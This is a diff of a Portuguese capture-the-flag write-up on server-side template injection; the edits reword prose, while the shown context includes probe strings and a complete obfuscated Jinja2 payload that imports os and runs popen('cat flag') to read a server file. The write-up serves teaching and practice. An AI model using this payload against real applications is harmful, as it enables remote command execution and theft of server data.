@@ -24,7 +24,7 @@ O primeiro payload a verificar é `${7*7}`. Inserindo tem como saída:
 
 [![input1.png](https://i.postimg.cc/xC01FYW6/input1.png)](https://postimg.cc/NyztKhGX)
 
-Não funcionou, o programa apenas interpretou como texto comum, não executou o programa.
+Não funcionou, o programa apenas interpretou como texto comum e não executou o código.
 
 Seguindo a tabela, o próximo payload a ser inserido é `{{7*7}}`. Inserindo se tem como saída.
 
@@ -62,7 +62,7 @@ Inserindo ele, retorna a informação de arquivos localizados na pasta atual
 
 Com essa saída constatou-se a existência de um arquivo `flag`.
 
-Agora precisa se acessar o conteúdo do arquivo, através do comando `cat` e indicando o arquivo em questão, se gera o payload:
+Agora é necessário acessar o conteúdo do arquivo, através do comando `cat` e indicando o arquivo em questão, se gera o payload:
 ```
 {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}
 ```
